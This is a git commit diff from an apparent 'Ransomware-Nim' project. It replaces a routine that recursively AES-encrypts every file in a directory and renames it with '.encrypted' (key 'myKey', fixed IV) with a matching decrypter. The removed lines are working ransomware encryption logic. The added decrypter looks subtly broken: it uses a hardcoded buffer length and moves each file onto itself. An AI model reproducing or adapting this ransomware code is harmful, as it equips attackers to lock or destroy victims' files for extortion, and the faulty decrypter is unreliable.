28f39a035376c7b0e79d9b78dcadfffc569140de
Shantanu Shukla <shantanushukla64@gmail.com>
2022-02-18 01:42:16 +0530

    decrypter add

--- decrypter.nim
+++ decrypter.nim
@@ -9,30 +9,27 @@ func toByteSeq*(str: string): seq[byte] {.inline.} =
 let
     password: string = "myKey" # Our secret key
     path: string = "C:/Users/shant/Desktop/Ransomware-Nim/test"
-
+var length :int = 2701363
 for file in walkDirRec path:
    let fileSplit = splitFile(file)
-   if fileSplit.ext != ".encrypted":
-    echo fmt"[*] Encrypting: {file}"
+   if fileSplit.ext == ".encrypted":
+    echo fmt"[*] Decrypting: {file}"
     var
         inFileContents: string = readFile(file)
-        plaintext: seq[byte] = toByteSeq(inFileContents) 
-        ectx: CTR[aes256]
+        #encrypted data in this case
+        dctx: CTR[aes256]
         key: array[aes256.sizeKey, byte]
         iv: array[aes256.sizeBlock, byte]
-        encrypted: seq[byte] = newSeq[byte](len(plaintext))
+        encrypted =  newString(length)
     iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149]
     var expandedKey = sha256.digest(password)
     copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))
-    
-    echo len(inFileContents)
-    
-    ectx.init(key, iv)
-    ectx.encrypt(plaintext, encrypted)
-    ectx.clear()
 
-    let encodedCrypted = encode(encrypted)
-    let finalFile = file & ".encrypted" 
+    dctx.init(key, iv)
+    dctx.decrypt(decode(inFileContents), encrypted)
+    dctx.clear()    
+
+    let encodedCrypted = encrypted
+    let finalFile = file
     moveFile(file, finalFile)
     writeFile(finalFile, encodedCrypted)
-
